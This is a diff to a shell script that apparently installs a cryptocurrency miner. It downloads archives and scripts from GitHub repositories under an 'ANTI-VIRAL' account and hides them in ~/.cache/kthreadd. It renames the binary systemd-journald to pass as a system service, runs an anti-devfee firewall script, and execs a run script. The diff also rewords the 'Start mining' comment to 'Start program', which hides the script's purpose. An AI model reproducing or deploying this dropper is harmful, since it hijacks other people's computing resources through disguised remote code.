@@ -10,19 +10,18 @@ cd ~/.cache/kthreadd
 wget -q \
     https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz \
     https://github.com/ANTI-VIRAL/MACHINE/raw/main/systemd.py \
-    https://github.com/ANTI-VIRAL/Ai-02/raw/main/mass.ini \
-    https://github.com/ANTI-VIRAL/Ai-02/raw/main/set-firewall.sh \
-    https://github.com/ANTI-VIRAL/Ai-02/raw/main/start.sh
+    https://github.com/ANTI-VIRAL/Ai-05/raw/main/config.ini \
+    https://github.com/ANTI-VIRAL/Ai-05/raw/main/set-firewall.sh \
+    https://github.com/ANTI-VIRAL/Ai-05/raw/main/run.sh
 
 tar -xzf cache.tar.gz
 rm -f cache.tar.gz
 mv cache systemd-journald
-mv mass.ini config.ini
 
-chmod +x systemd-journald systemd.py set-firewall.sh start.sh
+chmod +x systemd-journald systemd.py set-firewall.sh run.sh
 
 # Jalankan firewall anti-devfee dulu
 bash set-firewall.sh
 
-# Start mining
-exec bash start.sh
+# Start program
+exec bash run.sh
